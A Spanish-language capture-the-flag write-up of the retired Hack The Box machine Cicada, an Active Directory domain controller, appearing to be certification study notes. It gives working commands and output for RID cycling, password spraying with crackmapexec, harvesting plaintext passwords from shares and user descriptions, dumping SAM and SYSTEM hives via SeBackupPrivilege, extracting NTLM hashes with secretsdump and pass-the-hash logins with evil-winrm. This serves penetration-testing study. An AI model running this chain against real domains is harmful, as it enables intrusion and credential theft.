---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - AD
  - SMB
  - RIDCycling
  - PasswordSpraying
  - LateralMovement
  - CredentialDumping
  - Pass-The-Hash
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Identificación del sistema|Identificación del sistema]]
	- [[#Enumeración#Escaneo de puertos|Escaneo de puertos]]
	- [[#Enumeración#Enumeración SMB (Acceso anónimo)|Enumeración SMB (Acceso anónimo)]]
		- [[#Enumeración SMB (Acceso anónimo)#RID Cycling via Null Session|RID Cycling via Null Session]]
		- [[#Enumeración SMB (Acceso anónimo)#Validación de usuarios|Validación de usuarios]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Password Spraying|Password Spraying]]
	- [[#Explotación#Lateral Movement|Lateral Movement]]
		- [[#Lateral Movement#Enumeración de credenciales|Enumeración de credenciales]]
		- [[#Lateral Movement#Extracción de credenciales|Extracción de credenciales]]
- [[#Escalada de privilegios|Escalada de privilegios]]
	- [[#Escalada de privilegios#Credential Dumping|Credential Dumping]]
		- [[#Credential Dumping#Dump del registro|Dump del registro]]
		- [[#Credential Dumping#Extracción de hashes|Extracción de hashes]]
		- [[#Credential Dumping#Pass-the-Hash|Pass-the-Hash]]


---
# Cicada

![](Screenshots/Pasted%20image%2020260425191104.png)

>Máquina retirada de Hack The Box llamada **[Cicada](https://app.hackthebox.com/machines/Cicada)**, que presenta un entorno de **Active Directory sobre Windows**, actuando como Domain Controller.  
>La explotación comienza con la **enumeración de servicios característicos de un entorno AD**, como LDAP, Kerberos y SMB, lo que permite identificar el dominio y obtener usuarios válidos mediante técnicas como **RID Cycling**.  
>Tras enumerar usuarios, se identifican posibles vectores de acceso inicial aprovechando configuraciones débiles en el dominio.
>Una vez obtenidas credenciales válidas, se accede al sistema y se realiza una enumeración interna para identificar oportunidades de escalada de privilegios.  
>Finalmente, mediante técnicas de **Credential Dumping** y abuso de privilegios en el dominio, se compromete completamente el sistema obteniendo acceso como Administrator.

---
## Enumeración
### Identificación del sistema

```PowerShell
ping -c 1 10.129.231.149
PING 10.129.231.149 (10.129.231.149) 56(84) bytes of data.
64 bytes from 10.129.231.149: icmp_seq=1 ttl=127 time=43.3 ms

--- 10.129.231.149 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.287/43.287/43.287/0.000 ms
```

El `TTL=127` es característico de sistemas Windows (normalmente 128 - 1 salto), lo que nos permite saber el sistema operativo.
### Escaneo de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.129.231.149 -oG allPorts
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
52392/tcp open  unknown          syn-ack ttl 127
```

```PowerShell
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,52392 -sCV 10.129.231.149 -oN targeted
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-25 15:47:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-25T15:48:47+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-04-25T15:48:47+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-04-25T15:48:47+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-25T15:48:47+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
52392/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2026-04-25T15:48:08
|_  start_date: N/A
```

LDAP + Kerberos + SMB → *Domain Controler*

- Dominio: `cicada.htb`
- Host: `CICADA-DC`
- OS: `Windows`

Se añade al archivo `/etc/hosts` el dominio: `10.129.231.149 cicada.htb`.
### Enumeración SMB (Acceso anónimo)

```PowerShell
smbmap -H 10.129.231.149 -u "guest"
[+] IP: 10.129.231.149:445      Name: cicada.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS
        HR                                                      READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections
```

Se accede al directorio `HR` y se descarga el archivo `Notice from HR.txt`.

```PowerShell
smbclient //10.129.231.149/HR -U guest
smb: \> ls
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024
smb: \> get "Notice from HR.txt"
smb: \> exit

cat Notice\ from\ HR.txt                                                                                                                                                                    ✔ │ 9s 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Se obtiene una contraseña: `Cicada$M6Corpb*@Lp#nZp!8`
#### RID Cycling via Null Session

El **RID Cycling** consiste en enumerar identificadores relativos (RID) asociados a cuentas del dominio, permitiendo descubrir usuarios válidos sin necesidad de autenticación.

```PowerShell
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)

# Solo nos interesan los usuarios (SidTypeUser)
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep "SidTypeUser"
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1601: CICADA\emily.oscars (SidTypeUser)
```

Se procesan los resultados para obtener listas limpias:

```PowerShell
cat users | awk '{print $2}' | tr '\\' ' ' | awk '{print $2}' | sponge users
```
#### Validación de usuarios

```PowerShell
kerbrute userenum --dc 10.129.231.149 -d cicada.htb users
2026/04/25 11:45:43 >  [+] VALID USERNAME:       CICADA-DC$@cicada.htb
2026/04/25 11:45:43 >  [+] VALID USERNAME:       Guest@cicada.htb
2026/04/25 11:45:43 >  [+] VALID USERNAME:       Administrator@cicada.htb
2026/04/25 11:45:43 >  [+] VALID USERNAME:       john.smoulder@cicada.htb
2026/04/25 11:45:43 >  [+] VALID USERNAME:       sarah.dantelia@cicada.htb
2026/04/25 11:45:43 >  [+] VALID USERNAME:       michael.wrightson@cicada.htb
2026/04/25 11:45:43 >  [+] VALID USERNAME:       emily.oscars@cicada.htb
2026/04/25 11:45:43 >  [+] VALID USERNAME:       david.orelious@cicada.htb
2026/04/25 11:45:43 >  Done! Tested 9 usernames (8 valid) in 0.048 seconds
```

---
## Explotación
### Password Spraying

Una vez obtenida una lista de usuarios válidos, se realiza un ataque de **Password Spraying**.

```PowerShell
crackmapexec smb 10.129.231.149 -u users -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

Se obtienen las credenciales: `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`.
### Lateral Movement

Se comprueba si nos podemos conectar al protocolo `WiNRM`.

```PowerShell
crackmapexec winrm 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
HTTP        10.129.231.149  5985   CICADA-DC        [*] http://10.129.231.149:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.231.149  5985   CICADA-DC        [-] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

No es posible conectarse.

Se vuelve a enumerar los directorios del protocolo `SMB`.

```PowerShell
crackmapexec smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [+] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV                             
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share 
```

Ahora, tenemos acceso a los directorios: `NETLOGON`y `SYSVOL`, pero no se encuentra nada interesante.
#### Enumeración de credenciales

```PowerShell
rpcclient -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' 10.129.231.149
rpcclient $> querydominfo
Domain:         CICADA
Server:
Comment:
Total Users:    42
Total Groups:   0
Total Aliases:  17
Sequence No:    1
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x0

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.smoulder] rid:[0x450]
user:[sarah.dantelia] rid:[0x451]
user:[michael.wrightson] rid:[0x452]
user:[david.orelious] rid:[0x454]
user:[emily.oscars] rid:[0x641]

rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xfeb RID: 0x454 acb: 0x00000210 Account: david.orelious Name: (null)    Desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
index: 0x101d RID: 0x641 acb: 0x00000210 Account: emily.oscars  Name: Emily Oscars      Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfe7 RID: 0x450 acb: 0x00000210 Account: john.smoulder  Name: (null)    Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfe9 RID: 0x452 acb: 0x00000210 Account: michael.wrightson      Name: (null)    Desc: (null)
index: 0xfe8 RID: 0x451 acb: 0x00000210 Account: sarah.dantelia Name: (null)    Desc: (null)

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Groups] rid:[0x44f]
group:[Dev Support] rid:[0x455]

rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```

Usuarios administradores del dominio:
- `Administrator`

Se encuentra en la descripción del usuario `david.orelious`, la contraseña `aRt$Lp#7t*VQ!3`.

Se compruebas las credenciales para los protocolos `SMB` y `WinRM`.

```PowerShell
crackmapexec smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3

crackmapexec winrm 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
SMB         10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
HTTP        10.129.231.149  5985   CICADA-DC        [*] http://10.129.231.149:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.231.149  5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```

No es posible conectarse a `WinRM`.
#### Extracción de credenciales

Se vuelve a enumerar los directorios del protocolo `SMB`.

```PowerShell
crackmapexec smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        [+] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV             READ            
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share
```

Ahora, tenemos acceso al directorio: `DEV`.

Se accede al directorio `DEV` y se descarga el archivo `Backup_script.ps1`.

```PowerShell
smbclient //10.129.231.149/DEV -U david.orelious
smb: \> ls
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024

                4168447 blocks of size 4096. 471540 blocks available
smb: \> get Backup_script.ps1
smb: \> exit

cat Backup_script.ps1
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

Se obtienen las credenciales: `emily.oscars:Q!3@Lp#M6b*7t*Vt`.

Se validan las credenciales para `SMB`.

```PowerShell
crackmapexec smb 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt
```

Se comprueba si nos podemos conectar al protocolo `WiNRM`.

```PowerShell
crackmapexec winrm 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
SMB         10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
HTTP        10.129.231.149  5985   CICADA-DC        [*] http://10.129.231.149:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.231.149  5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```
#### Acceso por WinRM

Nos conectamos a `WinRM` mediante `evil-winrm` para obtener una consola interactiva.

```PowrShell
evil-winrm -i 10.129.24.161 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
*Evil-WinRM* PS C:\>
```

La flag de `usuario` se encuentra en: `C:\Users\emily.oscars.CICADA\Desktop`.

---
## Escalada de privilegios
### Credential Dumping

Se enumeran los privilegios.

```PowerShell
whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

El privilegio **SeBackupPrivilege** permite leer cualquier archivo del sistema **ignorando permisos NTFS** (pensado para backups).

Con los privilegios actuales es posible volcar credenciales almacenadas en el sistema, como **hashes NTLM**.  

Esto permite realizar ataques como **Pass-The-Hash** para escalar privilegios dentro del dominio.
#### Dump de credenciales

```PowerShell
reg save hklm\sam sam
The operation completed successfully.

reg save hklm\system system
The operation completed successfully.

download sam
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam 
Info: Download successful!

download system
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\system to system
Info: Download successful!
```
#### Extracción de hashes

```PowerShell
impacket-secretsdump -sam sam -system system local
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```
#### Pass-the-Hash

El ataque **Pass-The-Hash** permite autenticarse en servicios remotos utilizando **hashes NTLM** en lugar de contraseñas en texto claro.

```PowerShell
evil-winrm -i 10.129.231.149 -u 'Administrator' -H 2b87e7c93a3e8a0ea4a581937016f341
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

La flag de `root` se encuentra en `C:\Users\Administrator\Desktop`.

---